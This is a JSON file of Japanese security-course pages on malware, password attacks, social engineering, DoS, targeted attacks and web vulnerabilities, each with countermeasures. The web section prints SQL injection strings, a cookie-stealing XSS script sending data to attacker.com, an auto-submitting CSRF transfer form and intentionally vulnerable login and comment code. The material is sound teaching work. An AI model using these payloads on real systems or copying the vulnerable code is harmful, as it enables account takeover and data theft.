{
  "topicId": "tech-3-5-2",
  "title": "脅威と対策",
  "pages": [
    {
      "id": 1,
      "title": "マルウェアの種類と特徴",
      "sections": [
        {
          "type": "text",
          "content": "**マルウェア（Malware）**とは、悪意のあるソフトウェア（Malicious Software）の総称です。マルウェアは、コンピュータやネットワークに侵入し、データの破壊、情報の窃取、システムの乗っ取りなどの被害をもたらします。マルウェアには、①**ウイルス**、②**ワーム**、③**トロイの木馬**、④**ランサムウェア**、⑤**スパイウェア**、などの種類があり、それぞれ感染方法や被害の特徴が異なります。"
        },
        {
          "type": "table",
          "headers": ["マルウェアの種類", "特徴", "感染方法"],
          "rows": [
            ["ウイルス", "他のプログラムに寄生し、自己増殖する。宿主プログラムが実行されると活動開始", "感染したファイルを実行、USBメモリ経由"],
            ["ワーム", "単独で存在し、ネットワーク経由で自動的に拡散する", "ネットワークの脆弱性を突いて自動拡散"],
            ["トロイの木馬", "正規のプログラムに偽装して侵入。自己増殖しない", "フリーソフトに偽装してダウンロードさせる"],
            ["ランサムウェア", "ファイルを暗号化し、復号と引き換えに身代金を要求", "メール添付ファイル、Webサイトの脆弱性"],
            ["スパイウェア", "個人情報やキー入力を盗み、外部に送信", "無料ソフトに同梱、Webサイトから自動インストール"]
          ]
        },
        {
          "type": "example",
          "title": "ウイルスの具体例と被害シナリオ",
          "content": "【マクロウイルス】\nマクロウイルスは、Microsoft Officeのマクロ機能（VBAプログラム）を悪用するウイルスです。\n\n【感染シナリオ】\n①攻撃者が、マクロウイルスを仕込んだWordファイル（請求書.docx）をメールに添付して送信\n②社員がメールを開き、「マクロを有効にする」ボタンをクリック\n③マクロウイルスが実行され、PC内の全てのWordファイルに感染\n④感染したWordファイルを他の社員にメールで送ると、さらに感染が拡大\n\n【被害】\n①感染したWordファイルが開けなくなる\n②PC内のファイルが削除される\n③アドレス帳の全員に感染メールが自動送信される\n\n【対策】\n①信頼できない送信者からのメールの添付ファイルは開かない\n②マクロの自動実行を無効化する（Office設定で「マクロを無効にする」）\n③ウイルス対策ソフトを最新の状態に保つ"
        },
        {
          "type": "example",
          "title": "ワームの具体例：WannaCryランサムウェア攻撃（2017年）",
          "content": "【背景】\nWannaCryは、Windowsの脆弱性（EternalBlue）を悪用したランサムウェア型ワームです。2017年5月に世界中で150カ国、20万台以上のPCが感染しました。\n\n【感染と拡散のメカニズム】\n①攻撃者が、インターネット上の脆弱なWindowsサーバにWannaCryを送信\n②WannaCryがサーバに侵入し、自動的に実行される（ユーザーの操作不要）\n③WannaCryが、同じネットワーク内の他のPCをスキャンし、脆弱なPCに自動的に感染\n④感染したPCのファイルを暗号化し、「ビットコインで300ドル支払えば復号する」と身代金を要求\n⑤ネットワーク経由で、他の企業や組織にも感染が拡大（ワーム機能）\n\n【被害】\n①英国の国民保健サービス（NHS）：病院のシステムが停止し、手術が延期\n②日産自動車：英国の工場が操業停止\n③ルノー：フランスの工場が操業停止\n④全世界で数十億ドルの被害\n\n【対策】\n①Windowsのセキュリティパッチ（MS17-010）を適用（脆弱性を修正）\n②ネットワークのセグメント化（感染が広がらないように、ネットワークを分割）\n③オフラインバックアップ（暗号化されても復元できるように、定期的にバックアップ）"
        },
        {
          "type": "highlight",
          "icon": "💡",
          "title": "ウイルスとワームの違い",
          "content": "ウイルスは、他のプログラム（宿主）に寄生して感染を広げます。ユーザーが感染したファイルを実行しない限り、活動しません。一方、ワームは単独で存在し、ネットワーク経由で自動的に拡散します。ユーザーの操作なしに、脆弱性を突いて自動的に感染・拡散するため、被害が急速に広がるのが特徴です。WannaCryのように、ワームとランサムウェアを組み合わせたマルウェアは特に危険です。"
        }
      ]
    },
    {
      "id": 2,
      "title": "トロイの木馬、ランサムウェア、スパイウェア",
      "sections": [
        {
          "type": "example",
          "title": "トロイの木馬の具体例：偽セキュリティソフト",
          "content": "【攻撃シナリオ】\n①ユーザーがWebサイトを閲覧中、突然「ウイルスが検出されました！今すぐ駆除してください」というポップアップが表示される\n②ユーザーが「駆除する」ボタンをクリックすると、偽セキュリティソフト（トロイの木馬）がダウンロード・インストールされる\n③偽セキュリティソフトは、「100個のウイルスが見つかりました」と偽の警告を表示し、「有料版を購入すれば駆除できます」と促す\n④ユーザーがクレジットカード情報を入力すると、攻撃者に情報が送信される\n⑤トロイの木馬は、バックドア（裏口）を作成し、攻撃者が遠隔操作できるようにする\n\n【被害】\n①クレジットカード情報の窃取\n②PCが遠隔操作され、他のサーバへの攻撃に利用される（踏み台）\n③個人情報（メール、ファイル）の窃取\n\n【対策】\n①不審なポップアップは無視し、ブラウザを閉じる（タスクマネージャーから強制終了）\n②正規のセキュリティソフト以外はインストールしない\n③ダウンロードしたソフトは、ウイルススキャンしてから実行"
        },
        {
          "type": "example",
          "title": "ランサムウェアの具体例：標的型ランサムウェア攻撃",
          "content": "【背景】\n近年、企業を狙った標的型ランサムウェア攻撃が増加しています。攻撃者は、企業ネットワークに侵入し、バックアップも含めて全てのデータを暗号化してから身代金を要求します。\n\n【攻撃シナリオ】\n①攻撃者が、標的企業の社員に対してフィッシングメールを送信（「請求書をご確認ください」）\n②社員がメールの添付ファイル（請求書.xlsx）を開くと、マルウェアがインストールされる\n③マルウェアは、企業ネットワーク内で数週間～数ヶ月潜伏し、管理者権限を奪取\n④攻撃者が、ネットワーク全体を調査し、重要なサーバ（ファイルサーバ、バックアップサーバ）を特定\n⑤攻撃者が、バックアップを削除してから、全てのファイルを暗号化\n⑥「ビットコインで1億円支払えば、復号鍵を渡す。支払わなければデータを公開する」と脅迫\n\n【被害】\n①業務が完全停止（ファイルが全て暗号化され、アクセス不可）\n②バックアップも暗号化されているため、復元不可\n③身代金を支払っても、復号鍵がもらえる保証はない\n④顧客情報が公開され、信用失墜\n\n【対策】\n①オフラインバックアップ（ネットワークから切り離したバックアップ）\n②ネットワークのセグメント化（重要なサーバを別セグメントに隔離）\n③権限の最小化（社員には必要最小限の権限のみ付与）\n④セキュリティ監視（異常なアクセスを検知）"
        },
        {
          "type": "example",
          "title": "スパイウェアの具体例：キーロガー",
          "content": "【キーロガーとは】\nキーロガー（Keylogger）は、キーボードの入力内容を記録し、外部に送信するスパイウェアです。\n\n【感染シナリオ】\n①ユーザーが、無料のゲームソフトをダウンロードしてインストール\n②ゲームソフトに同梱されたキーロガーが、バックグラウンドで起動\n③キーロガーは、ユーザーのキーボード入力（パスワード、クレジットカード番号、メール内容）を全て記録\n④記録した内容を、定期的に攻撃者のサーバに送信\n\n【被害】\n①銀行口座のパスワードが盗まれ、不正送金される\n②クレジットカード番号が盗まれ、不正利用される\n③メールの内容が漏洩し、プライバシーが侵害される\n\n【対策】\n①信頼できないソフトウェアはインストールしない（公式サイトからのみダウンロード）\n②ウイルス対策ソフトで定期的にスキャン\n③重要なパスワード入力時は、ソフトウェアキーボード（画面上のキーボード）を使用\n④多要素認証を有効化（パスワードが盗まれても、ワンタイムパスワードで保護）"
        },
        {
          "type": "table",
          "headers": ["マルウェアの種類", "主な目的", "典型的な被害", "対策の重点"],
          "rows": [
            ["トロイの木馬", "バックドア作成、情報窃取", "遠隔操作、個人情報漏洩", "不審なソフトをインストールしない"],
            ["ランサムウェア", "身代金要求", "ファイル暗号化、業務停止", "オフラインバックアップ"],
            ["スパイウェア", "情報収集", "パスワード窃取、プライバシー侵害", "信頼できないソフトを避ける"]
          ]
        },
        {
          "type": "highlight",
          "icon": "🔒",
          "title": "ランサムウェア対策の最重要ポイント",
          "content": "ランサムウェアの被害を最小化するには、「オフラインバックアップ」が最も重要です。ネットワークに接続されたバックアップは、ランサムウェアに暗号化されてしまいます。定期的に、外付けHDD（ネットワークから切り離す）、テープメディア、クラウドの世代管理バックアップなど、複数の方法でバックアップを取得しましょう。また、バックアップからの復元訓練も定期的に実施し、いざという時に確実に復元できるようにしておくことが重要です。"
        }
      ]
    },
    {
      "id": 3,
      "title": "不正アクセスの手法（パスワード攻撃とソーシャルエンジニアリング）",
      "sections": [
        {
          "type": "text",
          "content": "**不正アクセス**とは、権限のない者がコンピュータやネットワークに侵入することです。不正アクセスの手法には、①**総当たり攻撃（ブルートフォース攻撃）**、②**辞書攻撃**、③**パスワードリスト攻撃**、④**ソーシャルエンジニアリング**、などがあります。これらの手法は、主にパスワードの脆弱性や人間の心理を突いて、不正にログインします。"
        },
        {
          "type": "table",
          "headers": ["攻撃手法", "方法", "対策"],
          "rows": [
            ["総当たり攻撃", "全ての文字の組み合わせを試す（例: aaaa → aaab → aaac...）", "複雑なパスワード（8文字以上、英数字記号混在）、アカウントロック"],
            ["辞書攻撃", "よく使われる単語を試す（例: password、123456、yamada）", "辞書にない複雑なパスワード、多要素認証"],
            ["パスワードリスト攻撃", "他サイトから流出したID・パスワードを試す", "サイトごとに異なるパスワードを使用"],
            ["ソーシャルエンジニアリング", "人間の心理を突いて情報を聞き出す（電話、メール、なりすまし）", "従業員教育、情報提供の手順確立"]
          ]
        },
        {
          "type": "example",
          "title": "総当たり攻撃の具体例と計算",
          "content": "【攻撃シナリオ】\n攻撃者が、あるWebサービスのログイン画面に対して、総当たり攻撃を実行します。\n\n【パスワードの強度と解読時間】\n①4桁の数字（0000～9999）：10,000通り\n  → 1秒に100回試行できる場合、100秒（約1.7分）で解読\n\n②8桁の英小文字（a～z）：26^8 = 約2,088億通り\n  → 1秒に100万回試行できる場合、約2,400日（約6.6年）で解読\n\n③8桁の英大小文字+数字（a～z, A～Z, 0～9）：62^8 = 約218兆通り\n  → 1秒に100万回試行できる場合、約691万年で解読\n\n④8桁の英大小文字+数字+記号（94種類）：94^8 = 約6京通り\n  → 1秒に100万回試行できる場合、約196億年で解読\n\n【対策】\n①複雑なパスワード：8文字以上、英大小文字+数字+記号を含める\n②アカウントロック：5回失敗したら、30分間ロック\n③CAPTCHA：ログイン時に画像認証を要求（自動化を防ぐ）"
        },
        {
          "type": "example",
          "title": "パスワードリスト攻撃の具体例",
          "content": "【背景】\n2020年、あるショッピングサイトから、100万件のID・パスワードが流出しました。攻撃者は、この流出したID・パスワードを使って、他のサイトへの不正ログインを試みます。\n\n【攻撃シナリオ】\n①攻撃者が、流出したID・パスワードリスト（100万件）を入手\n②攻撃者が、銀行サイトのログイン画面に対して、リストのID・パスワードを順番に試行\n③多くのユーザーは、複数のサイトで同じパスワードを使い回しているため、約3%（3万件）のアカウントで不正ログイン成功\n④攻撃者が、不正ログインしたアカウントから、残高を不正送金\n\n【被害】\n①3万人のユーザーが、銀行口座から不正送金される\n②1人あたり平均10万円の被害 → 合計30億円の被害\n\n【対策】\n①サイトごとに異なるパスワードを使用（パスワード管理ツールを活用）\n②多要素認証を有効化（パスワード + ワンタイムパスワード）\n③流出の通知を受けたら、すぐにパスワードを変更"
        },
        {
          "type": "example",
          "title": "ソーシャルエンジニアリングの具体例",
          "content": "【電話によるなりすまし】\n①攻撃者が、企業のヘルプデスクを装って、社員に電話をかける\n  「こちらIT部です。システムのメンテナンスのため、パスワードを確認させてください」\n②社員が、疑わずにパスワードを教えてしまう\n③攻撃者が、そのパスワードを使って社内システムに不正ログイン\n\n【ゴミ箱からの情報収集（トラッシング）】\n①攻撃者が、企業のゴミ箱から、捨てられた書類を回収\n②書類に記載された社員名、電話番号、システム名などの情報を収集\n③収集した情報を使って、社員になりすましてヘルプデスクに電話し、パスワードリセットを依頼\n\n【受付での侵入（テイルゲーティング）】\n①攻撃者が、宅配業者を装って、企業の受付に現れる\n②社員がICカードでドアを開けた際に、「荷物が重いので手伝ってください」と声をかけ、一緒に入室\n③社員が去った後、攻撃者がオフィス内を探索し、機密情報を窃取\n\n【対策】\n①従業員教育：電話でパスワードを聞かれても絶対に教えない\n②書類のシュレッダー処理：機密情報が記載された書類は、必ずシュレッダーにかける\n③入退室管理：ICカード認証、防犯カメラ、受付での本人確認"
        },
        {
          "type": "highlight",
          "icon": "⚠️",
          "title": "ソーシャルエンジニアリングの危険性",
          "content": "ソーシャルエンジニアリングは、技術的な脆弱性ではなく、人間の心理（親切心、権威への服従、恐怖）を突く攻撃手法です。どれだけ技術的なセキュリティ対策を施しても、人間が騙されてしまえば、情報は簡単に漏洩します。従業員教育が最も重要な対策です。「怪しい電話には対応しない」「知らない人を社内に入れない」「パスワードは絶対に教えない」というルールを徹底しましょう。"
        }
      ]
    },
    {
      "id": 4,
      "title": "サイバー攻撃の手法（DoS/DDoS、標的型攻撃、ゼロデイ攻撃）",
      "sections": [
        {
          "type": "text",
          "content": "**サイバー攻撃**とは、インターネットを経由してシステムに侵入・攻撃することです。代表的なサイバー攻撃には、①**DoS攻撃（Denial of Service）**：サーバに大量のアクセスを送り、サービスを停止させる、②**DDoS攻撃（Distributed DoS）**：複数のPCから同時にDoS攻撃を実行、③**標的型攻撃（APT: Advanced Persistent Threat）**：特定の組織を狙い、長期間潜伏して情報を窃取、④**ゼロデイ攻撃（Zero-day Attack）**：未公開の脆弱性を悪用、などがあります。"
        },
        {
          "type": "example",
          "title": "DoS攻撃とDDoS攻撃の具体例",
          "content": "【DoS攻撃の仕組み】\nDoS攻撃（サービス妨害攻撃）は、サーバに大量のアクセス（リクエスト）を送信し、サーバの処理能力を超えさせることで、正規のユーザーがアクセスできなくする攻撃です。\n\n【攻撃シナリオ（SYN Flood攻撃）】\n①攻撃者が、Webサーバに対して、大量のSYNパケット（TCP接続要求）を送信\n②Webサーバは、各SYNパケットに対してSYN-ACKを返し、接続を待機\n③攻撃者は、最後のACKを送信せず、接続を確立しない（半開き接続）\n④Webサーバは、大量の半開き接続を保持し、メモリとCPUを消費\n⑤正規のユーザーがアクセスしようとしても、サーバが応答できない（サービス停止）\n\n【DDoS攻撃の仕組み】\nDDoS攻撃（分散DoS攻撃）は、複数のPC（ボットネット）から同時にDoS攻撃を実行する攻撃です。\n\n【攻撃シナリオ】\n①攻撃者が、マルウェアに感染させた10万台のPC（ボット）を遠隔操作（ボットネット）\n②攻撃者が、10万台のボットに対して、「特定のWebサイトに一斉にアクセスせよ」と指令\n③10万台のボットが、同時にWebサーバにアクセス\n④Webサーバは、毎秒100万リクエストを受信し、処理能力を超えてダウン\n⑤正規のユーザーがアクセスできなくなる\n\n【被害】\n①ECサイトが停止し、売上が失われる（Amazon級のサイトで、1分のダウンタイムで数千万円の損失）\n②企業のWebサイトが停止し、信用が失墜\n\n【対策】\n①ファイアウォールでSYN Floodを検知・遮断\n②CDN（Content Delivery Network）を利用（CloudflareなどのDDoS対策サービス）\n③帯域幅を増やす（ただし、大規模DDoS攻撃には限界あり）"
        },
        {
          "type": "example",
          "title": "標的型攻撃の具体例",
          "content": "【背景】\n標的型攻撃（APT: Advanced Persistent Threat）は、特定の組織（政府機関、大企業、研究機関）を狙い、長期間（数ヶ月～数年）潜伏して、機密情報を窃取する高度な攻撃です。\n\n【攻撃シナリオ】\n①攻撃者が、標的企業の社員（経理部の山田さん）に対して、取引先を装ったメールを送信\n  件名：「請求書の件でご確認ください」\n  添付ファイル：請求書_2024年10月.xlsx（実際はマルウェア）\n\n②山田さんがExcelファイルを開くと、マルウェア（バックドア型トロイの木馬）がインストールされる\n\n③マルウェアは、定期的に攻撃者のサーバと通信し、指令を受け取る（C&Cサーバとの通信）\n\n④攻撃者が、山田さんのPCを遠隔操作し、企業ネットワーク内を探索\n  - 他の社員のPCに侵入（ネットワーク内の横展開）\n  - 管理者権限を奪取（権限昇格）\n  - ファイルサーバにアクセスし、機密情報（新製品の設計図、顧客リスト）をダウンロード\n\n⑤攻撃者が、数ヶ月～1年かけて、大量の機密情報を窃取\n\n⑥企業が、情報流出に気づく（競合他社が同じ製品を発表、顧客情報がダークウェブで売られている）\n\n【被害】\n①新製品の設計図が流出し、競合他社に先を越される\n②顧客情報が流出し、信用失墜・損害賠償\n③数十億円の被害\n\n【対策】\n①メールの添付ファイルは、信頼できる送信者からのみ開く（送信者に電話で確認）\n②メールセキュリティ（添付ファイルのサンドボックス解析）\n③ネットワークの監視（異常な通信を検知）\n④権限の最小化（社員には必要最小限の権限のみ）\n⑤セキュリティ教育（標的型攻撃メールの見分け方を訓練）"
        },
        {
          "type": "example",
          "title": "ゼロデイ攻撃の具体例",
          "content": "【ゼロデイ攻撃とは】\nゼロデイ攻撃は、ソフトウェアの脆弱性が公開される前（パッチが提供される前）に、その脆弱性を悪用する攻撃です。「ゼロデイ」は、脆弱性が公開されてから「0日」（まだ修正されていない）という意味です。\n\n【攻撃シナリオ（Adobe Flash Playerの脆弱性を悪用）】\n①攻撃者が、Adobe Flash Playerの未公開の脆弱性を発見\n②攻撃者が、脆弱性を悪用した悪意のあるFlashファイルを作成し、Webサイトに埋め込む\n③ユーザーが、Webサイトを閲覧すると、Flashファイルが自動的に実行される\n④脆弱性を突いて、マルウェアがユーザーのPCにインストールされる\n⑤Adobeが脆弱性を認識し、パッチを公開するまで、全てのFlash Playerユーザーが危険にさらされる\n\n【被害】\n①パッチが公開されるまでの期間（数週間～数ヶ月）、大量のPCが感染\n②個人情報の窃取、PCの乗っ取り\n\n【対策】\n①使用していないソフトウェアはアンインストール（Flash Playerなど）\n②ソフトウェアを最新の状態に保つ（自動更新を有効化）\n③IDS/IPS（侵入検知・防止システム）で異常な通信を検知\n④仮想環境（サンドボックス）で不審なファイルを実行"
        },
        {
          "type": "table",
          "headers": ["攻撃手法", "目的", "対策の重点"],
          "rows": [
            ["DoS/DDoS攻撃", "サービス停止", "CDN、帯域幅増強、ファイアウォール"],
            ["標的型攻撃", "機密情報窃取", "メール訓練、ネットワーク監視、権限管理"],
            ["ゼロデイ攻撃", "未修正の脆弱性悪用", "ソフトウェア更新、IDS/IPS、サンドボックス"]
          ]
        },
        {
          "type": "highlight",
          "icon": "🎯",
          "title": "標的型攻撃の特徴",
          "content": "標的型攻撃は、特定の組織を狙った高度な攻撃です。攻撃者は、事前に標的組織を調査し（社員の名前、取引先、使用しているシステムなど）、説得力のあるメールを作成します。また、長期間（数ヶ月～数年）潜伏し、少しずつ情報を窃取するため、検知が非常に困難です。対策には、①従業員のセキュリティ意識向上（メール訓練）、②ネットワーク監視（異常な通信の検知）、③権限管理（最小権限の原則）、が不可欠です。"
        }
      ]
    },
    {
      "id": 5,
      "title": "Webアプリケーションの脆弱性（SQLインジェクション、XSS、CSRF）",
      "sections": [
        {
          "type": "text",
          "content": "**Webアプリケーションの脆弱性**とは、Webサイトやアプリケーションに存在するセキュリティの欠陥です。代表的な脆弱性には、①**SQLインジェクション**：SQL文を不正に操作し、データベースから情報を窃取、②**クロスサイトスクリプティング（XSS）**：悪意のあるスクリプトを埋め込み、他のユーザーを攻撃、③**クロスサイトリクエストフォージェリ（CSRF）**：ユーザーに意図しない操作を実行させる、④**セッションハイジャック**：セッションIDを盗み、なりすまし、などがあります。"
        },
        {
          "type": "example",
          "title": "SQLインジェクションの具体例",
          "content": "【背景】\nSQLインジェクションは、WebアプリケーションのSQL文に不正な文字列を挿入し、データベースを不正に操作する攻撃です。\n\n【脆弱なコード例（ログイン機能）】\n```python\n# ユーザーが入力したID・パスワードを受け取る\nuser_id = request.form['user_id']  # 例: \"admin\"\npassword = request.form['password']  # 例: \"password123\"\n\n# SQL文を構築（脆弱！）\nsql = \"SELECT * FROM users WHERE user_id = '\" + user_id + \"' AND password = '\" + password + \"'\"\n\n# SQL文を実行\nresult = db.execute(sql)\n```\n\n【攻撃シナリオ】\n攻撃者が、ログイン画面で以下の入力をします。\n  ユーザーID: `admin' --`\n  パスワード: （何でもよい）\n\nすると、SQL文は以下のようになります。\n```sql\nSELECT * FROM users WHERE user_id = 'admin' --' AND password = 'anything'\n```\n\n`--`はSQLのコメント記号なので、それ以降は無視されます。つまり、以下のSQL文が実行されます。\n```sql\nSELECT * FROM users WHERE user_id = 'admin'\n```\n\nパスワードのチェックが無視され、攻撃者は管理者アカウントでログインできてしまいます。\n\n【さらに深刻な攻撃】\n攻撃者が、以下の入力をすると、全ユーザーの情報を取得できます。\n  ユーザーID: `' OR '1'='1`\n  パスワード: （何でもよい）\n\nSQL文は以下のようになります。\n```sql\nSELECT * FROM users WHERE user_id = '' OR '1'='1' AND password = 'anything'\n```\n\n`'1'='1'`は常に真なので、全ユーザーの情報が返されます。\n\n【被害】\n①管理者アカウントに不正ログイン\n②全ユーザーの情報（メールアドレス、パスワード）が漏洩\n③データベースの全てのデータが削除される（`'; DROP TABLE users; --`）\n\n【対策】\n①プレースホルダ（パラメータ化クエリ）を使用\n```python\nsql = \"SELECT * FROM users WHERE user_id = ? AND password = ?\"\nresult = db.execute(sql, (user_id, password))\n```\n②入力値の検証（特殊文字をエスケープ）\n③WAF（Web Application Firewall）でSQLインジェクションを検知・遮断"
        },
        {
          "type": "example",
          "title": "クロスサイトスクリプティング（XSS）の具体例",
          "content": "【背景】\nXSS（Cross-Site Scripting）は、Webページに悪意のあるスクリプト（JavaScript）を埋め込み、他のユーザーがそのページを閲覧した際にスクリプトを実行させる攻撃です。\n\n【脆弱なコード例（掲示板の投稿機能）】\n```python\n# ユーザーが投稿した内容を受け取る\ncomment = request.form['comment']  # 例: \"こんにちは\"\n\n# 投稿内容をHTMLに埋め込む（脆弱！）\nhtml = \"<p>\" + comment + \"</p>\"\n```\n\n【攻撃シナリオ】\n攻撃者が、掲示板に以下の投稿をします。\n```html\n<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>\n```\n\nすると、HTMLは以下のようになります。\n```html\n<p><script>document.location='http://attacker.com/steal?cookie='+document.cookie</script></p>\n```\n\n他のユーザーが掲示板を閲覧すると、このスクリプトが実行され、ユーザーのクッキー（セッションIDを含む）が攻撃者のサーバに送信されます。\n\n【被害】\n①ユーザーのセッションIDが盗まれ、なりすましログイン（セッションハイジャック）\n②ユーザーのブラウザが、攻撃者のサイトにリダイレクトされる\n③フィッシングサイトが表示され、パスワードが盗まれる\n\n【対策】\n①HTMLエスケープ（特殊文字を無害化）\n```python\nimport html\ncomment = html.escape(comment)  # \"<script>\" → \"&lt;script&gt;\"\nhtml = \"<p>\" + comment + \"</p>\"\n```\n\n②Content Security Policy（CSP）を設定（インラインスクリプトを禁止）\n```\nContent-Security-Policy: script-src 'self'\n```\n\n③HTTPOnlyフラグをクッキーに設定（JavaScriptからクッキーにアクセス不可）"
        },
        {
          "type": "example",
          "title": "クロスサイトリクエストフォージェリ（CSRF）の具体例",
          "content": "【背景】\nCSRF（Cross-Site Request Forgery）は、ユーザーが意図しない操作を実行させる攻撃です。ユーザーがログイン中のサイト（例: 銀行サイト）に対して、攻撃者が用意したリンクやフォームから、不正なリクエストを送信させます。\n\n【攻撃シナリオ】\n①ユーザーが、銀行サイトにログイン中（セッションIDがクッキーに保存されている）\n②攻撃者が、ユーザーに以下のような罠のページを送信（メールやSNS経由）\n```html\n<html>\n<body>\n<h1>おめでとうございます！プレゼントが当たりました！</h1>\n<form action=\"https://bank.com/transfer\" method=\"POST\" id=\"form\">\n  <input type=\"hidden\" name=\"to\" value=\"attacker_account\">\n  <input type=\"hidden\" name=\"amount\" value=\"1000000\">\n</form>\n<script>document.getElementById('form').submit();</script>\n</body>\n</html>\n```\n\n③ユーザーが罠のページを開くと、自動的にフォームが送信される\n④銀行サイトは、ユーザーのクッキー（セッションID）を確認し、正規のリクエストと判断\n⑤100万円が攻撃者の口座に送金される\n\n【被害】\n①意図しない送金が実行される\n②パスワードが変更される\n③アカウント情報が書き換えられる\n\n【対策】\n①CSRFトークンを使用（各リクエストに一意のトークンを付与）\n```html\n<form action=\"/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"csrf_token\" value=\"ランダムな文字列\">\n  <input type=\"text\" name=\"to\">\n  <input type=\"text\" name=\"amount\">\n  <button type=\"submit\">送金</button>\n</form>\n```\n\nサーバ側で、トークンが正しいか確認します。攻撃者は、トークンを知らないため、不正なリクエストは拒否されます。\n\n②SameSite属性をクッキーに設定（クロスサイトからのリクエストでクッキーを送信しない）\n```\nSet-Cookie: session_id=abc123; SameSite=Strict\n```\n\n③重要な操作には、パスワードの再入力を要求"
        },
        {
          "type": "table",
          "headers": ["脆弱性", "攻撃内容", "主な対策"],
          "rows": [
            ["SQLインジェクション", "SQL文を不正に操作", "プレースホルダ、入力値検証、WAF"],
            ["XSS", "悪意のあるスクリプトを埋め込む", "HTMLエスケープ、CSP、HTTPOnlyフラグ"],
            ["CSRF", "意図しない操作を実行させる", "CSRFトークン、SameSite属性、パスワード再入力"]
          ]
        },
        {
          "type": "highlight",
          "icon": "🔐",
          "title": "Webアプリケーション開発の原則",
          "content": "Webアプリケーションのセキュリティを確保するには、「ユーザーからの入力は信頼しない」という原則が重要です。全ての入力値を検証し、エスケープ・サニタイズ（無害化）する必要があります。また、重要な機能（送金、パスワード変更）には、追加の認証（パスワード再入力、多要素認証）を実装しましょう。セキュアコーディング（プレースホルダ、HTMLエスケープ、CSRFトークン）を徹底することで、多くの脆弱性を防げます。"
        }
      ]
    }
  ]
}
